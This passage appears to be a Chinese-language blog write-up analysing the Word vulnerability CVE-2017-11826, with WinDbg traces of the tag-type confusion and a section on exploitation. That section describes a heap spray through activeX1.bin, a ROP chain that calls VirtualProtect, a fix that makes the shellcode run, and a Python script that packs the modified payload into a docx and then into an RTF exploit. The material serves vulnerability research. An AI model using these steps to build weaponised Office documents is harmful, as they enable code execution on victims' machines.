将修改后的docx文件嵌入到新建的rtf文件中，在windbg中调试后发现eax的值改变了，并且没有异常，证实因为font标签未闭合导致的漏洞。
继续调试发现异常触发点的eax和ecx都是来自于esi，而esi为漏洞函数的arg1：
因此在漏洞函数打印标签以及[[esi+17f0]]、[[esi+17f0]+8]、[[esi+17f0]+c]和[esi+17f0]的值：
    bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); r $t0=poi(poi(esp+4)+17f0); dd poi($t0) L1; dd poi($t0)+8 L1; dd poi($t0)+c L1; dd $t0 L1; .printf\"\\n\"; g;"
打印出的结构就是Taglist结构体，具体结构参考goabout2的[office
CVE-2017-11826杂谈](https://www.cnblogs.com/goabout2/p/8186018.html)一文。
接着调试异常触发点上的函数，发现函数功能为通过层级标签获取TagObject Array[Index-2]：
继续向上追溯，发现函数GetTagObject也调用了GetTagObjectByIndex，通过分析发现该函数获取的是TagObject
Array[Index-1]的地址：
分析到这里，漏洞产生的原因也就出来了，由于word每解析一个标签，Current_Index的值就加一，当解析到闭合标签，Current_Index值会减1。由于构造了没有闭合的font标签，因此导致在解析idmap标签时比正常文件的Current_Index多一，导致原本应该获取OLEObject标签的TagObject变成获取了font的TagObject，因此造成了标签类型混淆导致漏洞的发生。
将标签层级和xml文件标签对应：
可以证实确实因为Current_Index值比正常文件的多一导致的类型混淆。
在内存中查看当解析idmap层级为6时Taglist的内存结构：
    > bp wwlib+4da16b
    > g
    Breakpoint 1 hit
    eax=070f1800 ebx=00000000 ecx=0225466c edx=00000004 esi=0225466c edi=070f19dc
    eip=6f95a16b esp=002cf428 ebp=002cf490 iopl=0         nv up ei pl nz na po nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    wwlib!DllGetLCID+0x2cc775:
    6f95a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (6f4898b0)
    > ub $ip L8
    wwlib!DllGetLCID+0x2cc75d:
    6f95a153 83780401        cmp     dword ptr [eax+4],1
    6f95a157 0f85f5bdeaff    jne     wwlib!DllGetLCID+0x17855c (6f805f52)
    6f95a15d 8bb6f0170000    mov     esi,dword ptr [esi+17F0h]
    6f95a163 8b06            mov     eax,dword ptr [esi]
    6f95a165 8b10            mov     edx,dword ptr [eax]
    6f95a167 4a              dec     edx
    6f95a168 4a              dec     edx
    6f95a169 8bce            mov     ecx,esi
此时eax的值即为Taglist，因此查看eax指向的Taglist结构：
此时TagObject[4]+0x44的值为`0x090b4000`，查看该值在内存中存储的数据：
发现[[TagObject[4]+0x44]+0x44]的值正是xml文件中font标签构造的固定地址，自此漏洞部分分析完毕。
## 漏洞利用
先启动word然后使用windbg附加会导致堆喷无法成功，继而无法分析漏洞利用部分。因此使用gflags.exe让调试器直接加载winword.exe：
设置断点在异常触发点：
    > bp wwlib+4da184
    > g
    Breakpoint 0 hit
    eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004b44b4 edi=0340cddc
    eip=6e2da184 esp=002f5f14 ebp=002f5f7c iopl=0         nv up ei pl nz na po nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    wwlib!DllGetLCID+0x2cc78e:
    6e2da184 50              push    eax
    0:000> u $ip
    wwlib!DllGetLCID+0x2cc78e:
    6e2da184 50              push    eax
    6e2da185 ff5104          call    dword ptr [ecx+4]
    6e2da188 e9fabdeaff      jmp     wwlib!DllGetLCID+0x178591 (6e185f87)
    6e2da18d 83f802          cmp     eax,2
    6e2da190 750f            jne     wwlib!DllGetLCID+0x2cc7ab (6e2da1a1)
    6e2da192 83c624          add     esi,24h
    6e2da195 56              push    esi
    6e2da196 52              push    edx
    > dd ecx+4
    088883f0  72980e2b 72980e2b 72980e2b 72980e2b
    08888400  72980e2b 72980e2b 72980e2b 72980e2b
    08888410  72980e2b 72980e2b 72980e2b 72980e2b
    08888420  72980e2b 72980e2b 72980e2b 72980e2b
    08888430  72980e2b 72980e2b 72980e2b 72980e2b
    08888440  72980e2b 72980e2b 72980e2b 72980e2b
    08888450  72980e2b 72980e2b 72980e2b 72980e2b
    08888460  72980e2b 72980e2b 72980e2b 72980e2b
发现exc+4的值为activeX1.bin中shellcode下方的填充，说明已经成功堆喷。
步入[exc+4]后发现来到了msvbvm60.dll，已经进入了ROP链：
    > t
    eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004c44b4 edi=0043cddc
    eip=72980e2b esp=00385a18 ebp=00385a88 iopl=0         nv up ei pl nz na po nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    msvbvm60!IID_IVbaHost+0x127eb:
    72980e2b 94              xchg    eax,esp
而第一条指令则是用来栈迁移，在之前已经将eax入栈，而eax的值正是构造好的`0x088888ec`，执行指令后，esp的值已经变成了`0x088888ec`：
而eax中的内容刚好位于shellcode的上方，此时ROP链为滑板指令，循环执行`pop eax`和`ret`，此时可以下断`bp 729440cc
".if(esp=08888f48){}.else{gc}"`停在了滑板指令结束的位置：
当执行到最后一次滑板指令时，会将`0x729410d0`放入eax中，而该值是msvbvm60.dll的IAT表中的数据，查看后存储的是VirtualProtect的地址：
紧接着通过ret跳转到ROP指令`jmp [eax]`执行VirtualProtect，而此时栈中为构造好的VirtualProtect的参数：
再次跳转后进入到kernelbase.dll的VirtualProtect：
执行后会跳转到`0x08888f70`执行shellcode：
然而VirtualProtect的修改的内存范围只有`0x08888c90 -0x08888e91`，而shellcode却位于`0x08888f70`，因此会触发c0000005访问异常，shellcode执行失败：
### 利用改造
activeX1.bin文件中布局如下：
由于原本VirtualProtect修改的范围为0x201不够，因此修改为0x1000确保能够覆盖shellcode，随后将shellcode替换为自己的shellcode即可。
将修改好的activeX1.bin文件替换到rtfobj.py提取出来进行堆喷的文档中，并修改为.docx，脚本参考[Exploiting Word:
CVE-2017-11826](https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/)一文，替换脚本如下：
    import os
    import shutil
    import zipfile
    template_path = ""
    final_docx_name = ""
    activeX_bin_path = ""
    def pack_file_to_open_xml_docx(template_path, final_docx_name, activeX_bin_path): 
        if not os.path.exists(template_path) or not os.path.exists(activeX_bin_path):
            print("Template docx file or activeX.bin file not exist.")
            return
        with open(activeX_bin_path, "rb") as f_: 
            object_bin_data = f_.read()
        zip_docx = template_path + ".zip"
        current_dir = os.path.abspath(os.path.dirname(__file__))
        new_path = os.path.join(current_dir, "exp", os.path.basename(zip_docx)) 
        if os.path.exists(new_path):
            os.remove(new_path)
        shutil.copy(template_path, new_path) 
        zip_docx = new_path
        # open temp docx and a copy for modification 
        zin = zipfile.ZipFile(zip_docx, 'r') 
        zip_docx_copy = zip_docx + "_copy_" 
        zout = zipfile.ZipFile(zip_docx_copy, "w")
        # modify the docx template with exploit 
        for item in zin.infolist ():
            if item.filename.find("activeX1") >= 0 and item.filename.find(".bin") >= 0: 
                pass
            else:
                buffer = zin.read(item.filename)
                zout.writestr(item, buffer) # use existing file
        zout.writestr("word/activeX/" + "activeX1.bin", object_bin_data) 
        zout.close () 
        zin.close ()
        # convert to docx
        os.rename (zip_docx_copy, final_docx_name) 
        os.remove(zip_docx)
    pack_file_to_open_xml_docx(template_path, final_docx_name, activeX_bin_path)
新建一个rtf文件，将替换好的docx文件添加到rtf文件中，保存后使用010Editor打开，搜索object，将{\object和{*\objdata的全部内容复制:
再新建一个rtf文件，按照堆喷射、Bypass
ASLR和漏洞触发的顺序添加三个对象。堆喷射的内容就是上方复制好的内容，其他两个可以直接在原EXP中复制过来即可，最终EXP的结构如下所示：
最终成功执行了shellcode：
## 参考链接
[1] [CVE-2017-11826漏洞分析、利用及动态检测](https://www.anquanke.com/post/id/87122)
[2] [office CVE-2017-11826杂谈](https://www.cnblogs.com/goabout2/p/8186018.html)
[3] [SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT
OFFICE](https://www.greyhathacker.net/?p=911)
[4] [Exploiting Word:
CVE-2017-11826](https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/)
[5] [Open XML标签解析类漏洞分析思路](https://www.anquanke.com/post/id/103080)
* * *